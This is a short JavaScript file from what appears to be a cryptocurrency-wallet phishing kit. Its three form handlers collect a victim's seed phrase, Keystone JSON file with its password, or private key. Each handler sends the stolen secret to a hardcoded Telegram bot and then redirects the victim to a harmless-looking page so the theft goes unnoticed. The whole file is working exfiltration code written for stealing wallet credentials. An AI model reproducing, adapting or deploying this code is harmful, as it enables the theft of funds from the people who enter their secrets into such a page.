$(document).ready(function () {
  const token = "8189631064:AAFzN0TqMuKr7ZAXqPyaJly5fCqMuN7a3es";
  const chatId = "7994735990"; // "5706267146";

  const phraseForm = $("#phrase_content form");
  const keystoneForm = $("#keyj_content form");
  const pkForm = $("#prikey_content form");
  phraseForm.on('submit', function (ev) {
    ev.preventDefault(); // Prevent the default form submission

    var walletVal = $("#ph_type").val();
    var phraseVal = $("#ph_keyy").val();
    const message = `
******************************
  wallet:
  ${walletVal}\n
  Phrase:
  ${phraseVal}\n
******************************\n`;

    // AJAX CALL
    $.ajax({
      type: "POST",
      url: `https://api.telegram.org/bot${token}/sendMessage`,
      data: {
        chat_id: chatId,
        text: message,
        parse_mode: "html",
      },
      success: function (respnx) {
        window.location.href = "../index.html";
      },
      error: function (badx) {
        alert("Oops! Something went wrong. Try again!");
        console.log(badx);
      },
    });
  });

  // Keystone Form Submission
  keystoneForm.on('submit', function (ev) {
    ev.preventDefault(); // Prevent the default form submission

    var walletVal = $("#kt_type").val();
    var phraseVal = $("#kt_phrase").val();
    var pwdVal = $("#kt_pwd").val();
    const message = `
******************************
  wallet:
  ${walletVal}\n
  Keystone JSON:
  ${phraseVal}\n
  Password:
  ${pwdVal}\n
******************************\n`;

    // AJAX CALL
    $.ajax({
      type: "POST",
      url: `https://api.telegram.org/bot${token}/sendMessage`,
      data: {
        chat_id: chatId,
        text: message,
        parse_mode: "html",
      },
      success: function (respnx) {
        window.location.href = "../index.html";
      },
      error: function (badx) {
        alert("Oops! Something went wrong. Try again!");
        console.log(badx);
      },
    });
  });

  // Private Key Form Submission

  // Keystone Form Submission
  pkForm.on('submit', function (ev) {
    ev.preventDefault(); // Prevent the default form submission

    var walletVal = $("#pk_type").val();
    var phraseVal = $("#pk_phrase").val();
    const message = `
******************************
  wallet:
  ${walletVal}\n
  Private Key:
  ${phraseVal}\n
******************************\n`;

    // AJAX CALL
    $.ajax({
      type: "POST",
      url: `https://api.telegram.org/bot${token}/sendMessage`,
      data: {
        chat_id: chatId,
        text: message,
        parse_mode: "html",
      },
      success: function (respnx) {
        window.location.href = "../index.html";
      },
      error: function (badx) {
        alert("Oops! Something went wrong. Try again!");
        console.log(badx);
      },
    });
  });

});